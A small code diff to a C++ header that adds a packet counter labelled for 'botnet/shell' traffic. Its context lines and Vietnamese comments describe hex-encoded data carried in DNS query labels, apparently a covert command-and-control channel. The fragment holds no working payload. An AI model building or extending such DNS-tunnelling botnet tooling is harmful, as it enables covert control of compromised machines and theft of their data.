@@ -18,6 +18,7 @@ inline std::mutex queue_mutex;
 inline std::queue<std::string> execute_queue;
 inline std::mutex execute_mutex;
 inline bool should_stop_sender = false;
+inline int botnet_packetNumber = 0;  // Separate packet counter for botnet/shell
 // Giam max_len de tranh vuot gioi han do dai DNS query
 // DNS label max = 63, total max = 253
 // Format: c.packetNum.offset.id.HEXDATA.domain
